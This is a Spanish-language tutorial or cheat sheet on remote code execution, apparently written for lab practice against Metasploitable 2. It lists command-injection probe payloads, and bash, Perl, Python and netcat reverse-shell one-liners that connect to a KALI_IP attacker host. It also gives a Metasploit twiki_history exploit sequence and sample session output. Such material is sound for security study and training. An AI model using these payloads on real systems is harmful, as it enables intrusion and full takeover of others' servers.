# Remote Code Execution (RCE)

## Descripción

La ejecución remota de comandos (RCE) es una vulnerabilidad que permite a un atacante **ejecutar comandos arbitrarios del sistema operativo en el servidor remoto**. Es una de las vulnerabilidades más críticas ya que puede llevar a control total del sistema.

---

## Tipos de RCE

| Tipo | Descripción |
|------|-------------|
| **In-band** | El resultado del comando se muestra directamente en la respuesta HTTP |
| **Out-of-band** | El resultado se envía a un servidor externo (DNS, HTTP) |
| **Blind** | No hay respuesta visible, se infiere por comportamiento (tiempo, efectos) |

---

## Detección manual

### Inyección de comandos en parámetros web

Prueba metacaracteres de shell en parámetros:

```
# Punto y coma — ejecuta comandos en secuencia
http://TARGET/page.php?input=test;id

# Pipe — encadena comandos
http://TARGET/page.php?input=test|id

# Backticks — sustitución de comandos
http://TARGET/page.php?input=`id`

# Dólar — sustitución de comandos
http://TARGET/page.php?input=$(id)
```

Si la respuesta incluye algo como `uid=33(www-data)`, hay RCE.

### Verificar con ping (blind RCE)

En Kali, escucha pings:
```shell
sudo tcpdump -i eth0 icmp
```

Desde el navegador:
```
http://TARGET/page.php?input=;ping+-c+1+KALI_IP;
```

Si recibes el ping, hay RCE aunque no veas la respuesta.

---

## Obtener una reverse shell

Una vez confirmado el RCE, el siguiente paso es obtener una shell interactiva.

### Paso 1 — Levantar listener en Kali

```shell
nc -lvnp 4444
```

### Paso 2 — Enviar reverse shell desde la víctima

**Bash:**
```bash
bash -i >& /dev/tcp/KALI_IP/4444 0>&1
```

**Perl:**
```perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"KALI_IP:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){system $_;}'
```

**Python:**
```python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("KALI_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**Netcat (si tiene -e):**
```bash
nc KALI_IP 4444 -e /bin/bash
```

**Netcat (versión OpenBSD sin -e):**
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc KALI_IP 4444 > /tmp/f
```

---

## Mejorar la shell recibida

Las reverse shells básicas son inestables. Para mejorarlas:

```shell
# Dentro de la shell recibida
python -c 'import pty; pty.spawn("/bin/bash")'
# o Python 3
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## RCE via Metasploit

Muchas aplicaciones web vulnerables tienen módulos en Metasploit:

```shell
search type:exploit twiki
use exploit/unix/webapp/twiki_history
set RHOSTS TARGET_IP
set LHOST KALI_IP
set LPORT 4444
set PAYLOAD cmd/unix/reverse_perl
run
```

---

## Notas importantes

- Siempre levanta el **listener antes** de lanzar el exploit. La conexión se intenta en el momento exacto de la ejecución.
- Si el exploit dice `Successfully sent` pero no hay sesión, el problema suele ser **conectividad de red** o **LHOST incorrecto**.
- Verifica tu IP con `ip a` — en entornos con múltiples interfaces puede que el LHOST apunte a la interfaz incorrecta.
- La shell obtenida suele ser como un usuario de bajo privilegio (`www-data`, `apache`). Necesitarás escalar privilegios para obtener root.

---

## Ejemplo real — Máquina Metasploitable 2

TWiki ~2003 era vulnerable a RCE via el módulo `twiki_history` de Metasploit. El payload en Perl se enviaba al servidor y establecía una conexión inversa:

```
[*] Started reverse TCP handler on 192.168.56.102:8888
[+] Successfully sent exploit request
[*] Command shell session 1 opened (192.168.56.102:8888 -> 192.168.56.101:59355)
```

Shell obtenida como `www-data`. Posteriormente escalada a root via udev.
